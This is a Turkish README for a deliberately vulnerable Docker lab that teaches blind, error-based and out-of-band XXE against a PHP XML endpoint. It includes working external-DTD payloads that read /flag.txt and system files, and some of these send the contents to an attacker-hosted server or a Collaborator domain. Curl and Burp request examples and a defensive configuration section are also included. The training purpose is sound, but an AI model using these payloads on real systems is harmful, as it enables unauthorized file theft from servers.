# AltaySec Data Sync // Blind & Error-Based XXE CTF Lab

> Orta seviye, Dockerize edilmiş bir XXE (XML External Entity) zafiyet laboratuvarı. Hedef, `/flag.txt` veya `/etc/hostname` içeriğini panel'in arayüzünde **hiçbir XML içeriği yansımadığı** halde dışarı sızdırmak.

```
+-----------------------------------------+
|   ALTAYSEC // DATA SYNC                 |
|   Veri Entegrasyon Paneli   v2.4.1      |
+-----------------------------------------+
|   [ Upload ]   [ Logs ]   [ Schema ]    |
|   [ About  ]                            |
+-----------------------------------------+
|                                         |
|   > [ + ]  Sürükle-Bırak XML            |
|   > XML INPUT (manuel)                  |
|   > >> ISLE & SENKRONIZE ET             |
|                                         |
|   > Sistem Durumu: Beklemede...   [HH:MM]
+-----------------------------------------+
```

---

## 1. Lab Bilgileri

| Anahtar | Değer |
|---|---|
| Stack | PHP 8.2 + Apache 2.4 + libxml2 2.9 |
| Çalışma adresi | `http://localhost:8080` |
| Hedef dosyalar | `/flag.txt`, `/etc/hostname` |
| Flag formatı | `ALTAYSEC{...}` |
| Zafiyet kategorisi | **Blind / Error-Based / OOB XXE** |
| Zorluk | Orta |

### Sunucu Davranışı

- Başarılı parse → `{"status":"ok","message":"Veri islendi.", ...}` — **XML içeriği DÖNDÜRÜLMEZ** (Blind).
- libxml hatası → `{"status":"error","message":"Sistem hatasi: <libxml error>"}` — hata mesajı kullanıcıya yansır (Error-based mümkün).
- `LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR` aktif, `LIBXML_NONET` **set edilmemiş** → harici DTD ve HTTP-tabanlı OOB mümkün.

---

## 2. Kurulum

```bash
docker compose up -d --build
```

Tarayıcı: `http://localhost:8080`

Komutla sağlık kontrolü:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080/        # 200 olmalı
docker ps --filter "name=altaysec-data-sync-xxe"                       # healthy olmalı
```

Durdurmak için:

```bash
docker compose down
```

---

## 3. Mimari

```
+---------------------+      POST xml_data       +-----------------------+
|  Tarayıcı / Burp    | -----------------------> |  Apache + PHP 8.2     |
|  ATTACKER           |                          |  /process.php         |
+---------------------+                          |    DOMDocument::      |
            ^                                    |     loadXML(          |
            |   HTTP GET /evil.dtd  (OOB)        |       LIBXML_NOENT |  |
            |   HTTP GET /?leak=…   (OOB)        |       LIBXML_DTDLOAD| |
            |                                    |       LIBXML_DTDATTR  |
+---------------------+                          |     )                 |
|  Saldırgan Sunucusu |                          |  /flag.txt (0640)     |
|  (Python http.server|                          |  /etc/hostname        |
|   veya Burp         |                          +-----------------------+
|   Collaborator)     |
+---------------------+
```

Endpoint listesi:

| Method | Path           | Görev |
|--------|----------------|-------|
| GET    | `/`            | Veri Entegrasyon Paneli (HTML/JS) |
| POST   | `/process.php` | **XXE'nin barındığı XML işleyici** |
| GET    | `/logs.php`    | Son istek logları (JSON) |
| GET    | `/info.php`    | Platform/runtime metadata |

---

## 4. Zafiyetin Anatomisi (`process.php`)

```php
$parserOptions = LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR;

$doc = new DOMDocument('1.0', 'UTF-8');
$doc->resolveExternals   = true;
$doc->substituteEntities = true;
$doc->loadXML($rawXml, $parserOptions);
```

- `LIBXML_NOENT` → entity'leri parse sırasında **substitute** eder.
- `LIBXML_DTDLOAD` → harici DTD URL'lerini **fetch** eder.
- `LIBXML_NONET` set **değil** → `http://`, `ftp://` gibi harici şemalara çıkış serbest.
- Başarı dalında parse edilen DOM **döndürülmez**, sadece `nodes` ve `received byte` sayıları döner → klasik **Blind** durumu.
- Başarısız parse'ta `libxml_get_errors()[0]->message` `"Sistem hatasi: "` prefix'i ile **kullanıcıya yansır** → **Error-Based** vektörü.

---

## 5. Reconnaissance

### 5.1 Uygulamayı kokla

```bash
curl -s http://localhost:8080/info.php | jq
```

Çıktı `runtime.libxml`, `endpoints` ve "harici DTD yuklemesine acik" notunu açıkça veriyor. Saldırgan için ilk büyük ipucu burada.

### 5.2 Davranışı doğrula

| Test payload | Beklenen cevap |
|---|---|
| `<root><a/></root>` | `status:ok`, `nodes:2` — geçerli XML, içerik dönmedi |
| `<bad` | `status:error`, `message:"Sistem hatasi: Couldn't find end of Start Tag bad…"` — **hata mesajı yansıyor!** |
| `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>` | `status:ok` — entity okundu ama içerik gözükmedi → **Blind onayı** |

```bash
curl -s -X POST http://localhost:8080/process.php \
     -d 'xml_data=<bad'
```

---

## 6. Saldırı Yolu A — Error-Based XXE (Harici DTD ile)

### 6.1 Saldırgan sunucusunu başlat

Ev makinanda boş bir dizinde:

```bash
mkdir -p /tmp/attacker && cd /tmp/attacker
cat > evil.dtd <<'EOF'
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
EOF

python3 -m http.server 9001
```

> Windows için: `python -m http.server 9001`. Container'dan host'a erişim için `host.docker.internal` kullanılabilir (Docker Desktop'ta otomatik).

### 6.2 Payload'ı gönder

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://host.docker.internal:9001/evil.dtd">
  %remote;
]>
<root/>
```

```bash
curl -s -X POST http://localhost:8080/process.php \
     --data-urlencode 'xml_data=<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://host.docker.internal:9001/evil.dtd">
  %remote;
]>
<root/>'
```

### 6.3 Akış

1. Hedef sunucu `http://host.docker.internal:9001/evil.dtd` adresini fetch eder.
2. Harici DTD içinde `%file` parameter entity'si `/flag.txt`'i okur.
3. `%eval` yeni bir `%error` entity'si oluşturur — `file:///nonexistent/<FLAG_CONTENT>` şeklinde **geçersiz URI**.
4. libxml bu geçersiz URI'yi load etmeye çalışınca hata fırlatır.
5. Hata mesajı `"Invalid URI: file:///nonexistent/ALTAYSEC{bL1nd_xxe_v3ry_sneaky}"` kullanıcıya geri yansır.

### 6.4 Beklenen Cevap

```json
{
  "status": "error",
  "message": "Sistem hatasi: Invalid URI: file:///nonexistent/ALTAYSEC{bL1nd_xxe_v3ry_sneaky} (satir: 3)"
}
```

**Flag yakalandı.** `/etc/hostname` için aynı şeyi `file:///flag.txt` yerine `file:///etc/hostname` ile yap → `altaysec-data-sync` döner.

---

## 7. Saldırı Yolu B — Out-of-Band (OOB) HTTP Exfiltration

Hata mesajları görünmese bile, saldırgan sunucusunun **access log'una** flag düşürülebilir. Bu yöntem daha "stealth"tir.

### 7.1 evil.dtd

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.txt">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://host.docker.internal:9001/?leak=%file;'>">
%wrap;
%send;
```

> Not: `php://filter/…/convert.base64-encode` kullanıyoruz çünkü flag içeriği `{ }` gibi URL-unsafe karakterler içeriyor — base64 ile binary-safe tek satıra çevirip query-string'e koyuyoruz.

### 7.2 Payload (aynı)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://host.docker.internal:9001/evil.dtd">
  %remote;
]>
<root/>
```

### 7.3 Saldırgan tarafında log

`python3 -m http.server 9001` çıktısında:

```
172.x.x.x - - [.. ..:..:..] "GET /evil.dtd HTTP/1.0" 200 -
172.x.x.x - - [.. ..:..:..] "GET /?leak=QUxUQVlTRUN7Yk... HTTP/1.0" 404 -
```

```bash
echo "QUxUQVlTRUN7Yk..." | base64 -d
# → ALTAYSEC{bL1nd_xxe_v3ry_sneaky}
```

### 7.4 Burp Collaborator alternatifi

Kendi server'ını kurmak istemiyorsan Burp Suite'in Collaborator'ını kullanabilirsin:

1. Burp → **Collaborator** sekmesi → **Copy to clipboard** ile alt-domain al, örn. `abc123.oastify.com`.
2. `evil.dtd` host'la (yine kendi sunucunda veya direkt Collaborator'ın DNS özelliğiyle) — VEYA tek shot DNS exfiltration için DTD'yi tamamen Collaborator'a yönlendir:
   ```dtd
   <!ENTITY % file SYSTEM "file:///flag.txt">
   <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://%file;.abc123.oastify.com/'>">
   %wrap;
   %send;
   ```
   (Bu yöntem `/`/`{}` gibi DNS-uyumsuz karakterler nedeniyle her flag formatında çalışmaz — base64 encode'lu HTTP yolu daha güvenli.)

---

## 8. Burp Suite ile Adım Adım

1. **Proxy** açık tarayıcıda `http://localhost:8080`'i ziyaret et.
2. UPLOAD sekmesinde herhangi bir XML gönder (ÖRNEK YÜKLE → ISLE).
3. Burp HTTP History'de `POST /process.php` isteğini bul → **Send to Repeater** (`Ctrl+R`).
4. Repeater'da body'i şuna değiştir:

   ```
   xml_data=%3C%3Fxml+version%3D%221.0%22%3F%3E%0A%3C!DOCTYPE+foo+%5B%0A++%3C!ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2Fhost.docker.internal%3A9001%2Fevil.dtd%22%3E%0A++%25remote%3B%0A%5D%3E%0A%3Croot%2F%3E
   ```

   Decoded:

   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY % remote SYSTEM "http://host.docker.internal:9001/evil.dtd">
     %remote;
   ]>
   <root/>
   ```

5. `Content-Type: application/x-www-form-urlencoded` korunur. **Send** → response'da `Sistem hatasi: Invalid URI: file:///nonexistent/ALTAYSEC{...}` görünür.

---

## 9. Doğrulama Sonuçları (Lab Üzerinde Çalıştırıldı)

| # | Payload | Sonuç |
|---|---|---|
| 1 | Normal `<root><a/></root>` | `{"status":"ok","message":"Veri islendi.","processed":{"nodes":2,"received":51}}` |
| 2 | Bozuk `<bad` | `Sistem hatasi: Couldn't find end of Start Tag bad line 1 (satir: 2)` |
| 3 | Reflection denemesi `<root>&xxe;</root>` | `status:ok`, içerik dönmedi → **Blind onayı** |
| 4 | LIBXML_NONET probe `http://127.0.0.1:1/evil.dtd` | `failed to load external entity` → **ağ erişimi açık** |
| 5 | **Error-Based + harici DTD + `/flag.txt`** | `Sistem hatasi: Invalid URI: file:///nonexistent/ALTAYSEC{bL1nd_xxe_v3ry_sneaky}` |
| 6 | **Error-Based + harici DTD + `/etc/hostname`** | `Sistem hatasi: Invalid URI: file:///nonexistent/altaysec-data-sync` |

Tüm denemeler `LOGS` sekmesinden (veya `GET /logs.php`) izlenebilir.

---

## 10. Savunma (Bu Lab'da Bilerek Eksik Bırakılan)

Üretimde XXE'ye karşı önerilen ayarlar:

```php
// PHP 8+ için DTD/entity yüklemesini tamamen kapat:
$doc = new DOMDocument();
$doc->loadXML($rawXml, LIBXML_NONET);          // hiçbir ek flag yok

// VEYA simplexml için:
// libxml_disable_entity_loader(true);          // PHP < 8 deprecated ama tarihsel kullanım

// VEYA en güvenlisi: kendi şemana göre allowlist parser kullan (XSD validation)
```

Ek prensipler:
- `display_errors` üretimde **off**, sadece `log_errors`.
- Kullanıcıya libxml hata mesajları **asla** birebir yansıtılma.
- Network egress'i firewall ile sınırla (container outbound deny-by-default).
- Mümkünse JSON gibi XXE'siz formata geç.

---

## 11. Dosya Yapısı

```
.
├── docker-compose.yml      # 8080→80 mapping, healthcheck
├── Dockerfile              # PHP 8.2 + Apache, display_errors=On
├── flag.txt                # → /flag.txt (0640 root:www-data)
├── index.html              # AltaySec Data Sync UI (4 sekmeli SPA)
├── process.php             # ZAFİYETLİ XML işleyici
├── _log.php                # Ortak log helper
├── logs.php                # GET → son istekler JSON
├── info.php                # GET → platform/runtime bilgisi
└── README.md               # bu dosya
```

---

## 12. Temizlik

```bash
docker compose down -v
docker image rm altaysec/data-sync-xxe:latest
```

Konteyner içinde sadece test dosyaları kaldıysa:

```bash
docker exec altaysec-data-sync-xxe rm -f /tmp/evil.dtd /tmp/altaysec_data_sync.log
```

---

## 13. Referanslar

- [PortSwigger — XML External Entity (XXE) Injection](https://portswigger.net/web-security/xxe)
- [PortSwigger — Blind XXE](https://portswigger.net/web-security/xxe/blind)
- [OWASP — XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [HackTricks — XXE / XEE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [PayloadsAllTheThings — XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

## 14. Lisans / Sorumluluk Reddi

Bu lab **yalnızca eğitim amaçlıdır**. Açıklanan teknikleri yalnızca sahibi olduğunuz veya saldırı için açıkça izniniz olan sistemlerde kullanın. Bilgisayar Sistemlerine yetkisiz erişim suçtur.

`AltaySec Akademi // 2026`
